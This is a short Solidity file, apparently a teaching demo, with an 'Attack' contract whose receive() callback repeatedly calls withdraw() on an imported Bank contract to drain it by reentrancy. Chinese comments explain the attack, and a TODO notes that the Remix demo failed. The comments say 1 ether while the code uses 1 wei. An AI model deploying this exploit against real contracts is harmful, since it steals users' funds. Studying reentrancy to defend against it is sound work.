// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Bank.sol";

// TODO:Remix演示失败：Failed to send Ether
contract Attack {
    event attLog(uint256 balances);

    Bank public bank;

    constructor(Bank _bank) {
        bank = _bank;
    }
    
    // 回调函数，用于重入攻击Bank合约，反复的调用目标的withdraw函数
    receive() external payable {
        emit attLog(bank.getBalance());
        if (bank.getBalance() >= 1 wei) {
            bank.withdraw();
        }
    }

    // 攻击函数，调用时 msg.value 设为 1 ether
    function attack() external payable {
        require(msg.value == 1 wei, "Require 1 Ether to attack");
        bank.deposit{value: 1 wei}();
        bank.withdraw();
    }

    // 获取本合约的余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}